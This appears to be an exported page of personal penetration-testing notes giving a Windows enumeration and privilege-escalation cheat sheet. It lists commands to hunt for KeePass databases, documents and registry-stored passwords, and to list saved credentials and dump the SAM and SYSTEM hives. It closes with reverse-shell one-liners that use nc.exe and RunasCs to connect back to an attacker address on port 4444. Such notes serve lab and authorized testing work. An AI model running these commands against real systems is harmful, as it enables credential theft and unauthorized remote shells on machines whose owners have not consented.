<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01 - Enumeration</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01 - Enumeration</h1><br/><p><em><h2>Manual recon</h2></em></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># check home folder </span><br /><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\$</span>myuser<br /><span style="color:#0088ff;font-weight:400"># check root folder </span><br /><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#333333;font-weight:400">\<br /></span><span style="color:#0088ff;font-weight:400"># general system info </span><br />systeminfo<br /><br /><span style="color:#0088ff;font-weight:400">## check privileges on web directories </span><br />icacls C:<span style="color:#333333;font-weight:400">\x</span>ampp<span style="color:#333333;font-weight:400">\h</span>tdocs<br /><br /><span style="color:#0088ff;font-weight:400">## check for interesting programs</span><br /><span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files&quot;</span><br /><span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files (x86)&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## enum users, groups, services ...</span><br />Get-LocalUser<br />Get-LocalGroup<br />Get-LocalGroupMember <span style="color:#7f0044;font-weight:400">$group</span><br />net user <span style="color:#3ad900;font-weight:400">&quot;name of user&quot;</span><br />netsh firewall show config<br />tasklist /SVC<br />tasklist<br />net start DRIVERQUER<br />netstat -ano<br />net user /domain <span style="color:#7f0044;font-weight:400">$user</span><br />wmic service get name,displayname,pathname,startmode <span style="color:#ff9d00;font-weight:700">|</span> findstr /i <span style="color:#3ad900;font-weight:400">&quot;auto&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># find interesting files </span><br />Get-ChildItem -Path C:<span style="color:#333333;font-weight:400">\ </span>-Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue<br />Get-ChildItem -Path C:<span style="color:#333333;font-weight:400">\U</span>sers -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue<br />Get-ChildItem -Path C:<span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\a</span>riah<span style="color:#333333;font-weight:400">\ </span>-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue<br />gci -Recurse -File -ErrorAction SilentlyContinue<br /><span style="color:#0088ff;font-weight:400">## get history </span><br />Get-History<br /><br /><span style="color:#0088ff;font-weight:400">## check folders  </span><br /><span style="color:#333333;font-weight:400">\t</span>emp<span style="color:#333333;font-weight:400">\a</span>ccesschk.exe -qwsu <span style="color:#3ad900;font-weight:400">&quot;Everyone&quot;</span> *<br /><br /><span style="color:#0088ff;font-weight:400">## look password registry</span><br />reg query HKCU /f password /t REG_SZ /s<br />reg query HKLM /f password /t REG_SZ /s<br /><br /><span style="color:#0088ff;font-weight:400">## check installed apps: searchsploit version for vulns + search for speicif files (e.g keppas =&gt; kdbx ; xamp =&gt; conf,txt,ini...)</span><br />Get-ItemProperty <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">select</span> displayname <br />Get-ItemProperty <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">select</span> displayname<br /><br /><span style="color:#0088ff;font-weight:400">## review current runing processes</span><br />Get-Process<br /><br /><span style="color:#0088ff;font-weight:400">## list cheduled tasks</span><br />schtasks /query /fo LIST /v<br /><br /><span style="color:#0088ff;font-weight:400">## list any saved creds</span><br />cmdkey /list <br /><span style="color:#0088ff;font-weight:400">## run as saved creds</span><br />runas /savecred /user:admin <span style="color:#ff9d00;font-weight:700">&lt;</span>program<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br /><span style="color:#0088ff;font-weight:400">## dump system and sam hives</span><br />reg save hklm<span style="color:#333333;font-weight:400">\s</span>ystem system<br />reg save hklm<span style="color:#333333;font-weight:400">\s</span>am sam<br /><br /><span style="color:#0088ff;font-weight:400">## find SYSTEM and SAM backups</span><br /><span style="color:#0088ff;font-weight:400"># Usually %SYSTEMROOT% = C:\Windows</span><br />%SYSTEMROOT%<span style="color:#333333;font-weight:400">\r</span>epair<span style="color:#333333;font-weight:400">\S</span>AM<br />%SYSTEMROOT%<span style="color:#333333;font-weight:400">\S</span>ystem32<span style="color:#333333;font-weight:400">\c</span>onfig<span style="color:#333333;font-weight:400">\R</span>egBack<span style="color:#333333;font-weight:400">\S</span>AM<br />%SYSTEMROOT%<span style="color:#333333;font-weight:400">\S</span>ystem32<span style="color:#333333;font-weight:400">\c</span>onfig<span style="color:#333333;font-weight:400">\S</span>AM<br />%SYSTEMROOT%<span style="color:#333333;font-weight:400">\r</span>epair<span style="color:#333333;font-weight:400">\s</span>ystem<br />%SYSTEMROOT%<span style="color:#333333;font-weight:400">\S</span>ystem32<span style="color:#333333;font-weight:400">\c</span>onfig<span style="color:#333333;font-weight:400">\S</span>YSTEM<br />%SYSTEMROOT%<span style="color:#333333;font-weight:400">\S</span>ystem32<span style="color:#333333;font-weight:400">\c</span>onfig<span style="color:#333333;font-weight:400">\R</span>egBack<span style="color:#333333;font-weight:400">\s</span>ystem<br /></pre></div></p><p><h2>RunasCS (runas with no need for tty)</h2><ul><li>TTY <ul><li>runas /env /profile /user:Administrator &quot;C:\temp\nc.exe -e cmd.exe 192.168.45.215 4444&quot;</li></ul></li><li>No tty=&gt;<ul><li><a href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></li><li>.\RunasCs.exe $user $pass powershell.exe -r $lhost:4444</li></ul></li></ul></p></div>
</body>
</html>
